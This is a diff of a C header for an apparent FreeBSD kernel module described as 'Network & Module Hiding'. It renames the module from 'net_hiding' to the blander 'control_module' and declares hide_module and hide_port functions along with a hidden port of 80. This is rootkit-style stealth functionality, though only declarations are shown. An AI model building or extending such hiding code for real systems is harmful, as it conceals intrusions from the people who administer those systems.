@@ -1,12 +1,12 @@
 /*
  * =================================================================================
  *
- *       Filename:  net_hiding.h
+ *       Filename:  control_module.h
  *
  *    Description:  Network & Module Hiding
  *
  *        Version:  1.0
- *        Created:  22/06/2011 01:14:44
+ *        Created:  2012-05-30 01:13:16
  *       Revision:  none
  *       Compiler:  gcc
  *
@@ -15,8 +15,8 @@
  *
  * =================================================================================
  */
-#ifndef NET_HIDING_H
-#define NET_HIDING_H
+#ifndef control_module_H
+#define control_module_H
 
 #include <sys/types.h>
 #include <sys/param.h>
@@ -34,7 +34,6 @@
 #include <sys/mutex.h>
 #include <sys/sx.h>
 
-#include <net/if.h>
 #include <netinet/in.h>
 #include <netinet/in_pcb.h>
 #include <netinet/ip_var.h>
@@ -43,8 +42,8 @@
 #define TRUE        1
 #define FALSE       0
 
-#define MODULE_NAME "net_hiding"
-#define MODULE_FILE "net_hiding.ko"
+#define MODULE_NAME "control_module"
+#define MODULE_FILE "control_module.ko"
 #define MODULE_HIDE FALSE
 
 #define HIDDEN_PORT 80
@@ -80,6 +79,6 @@ struct hidden_port_args {
 static int module_events(struct module *, int, void *);
 
 static void hide_module(void);
-static void hide_port(struct thread *, void *);
+static int hide_port(struct thread *, void *);
 
 #endif
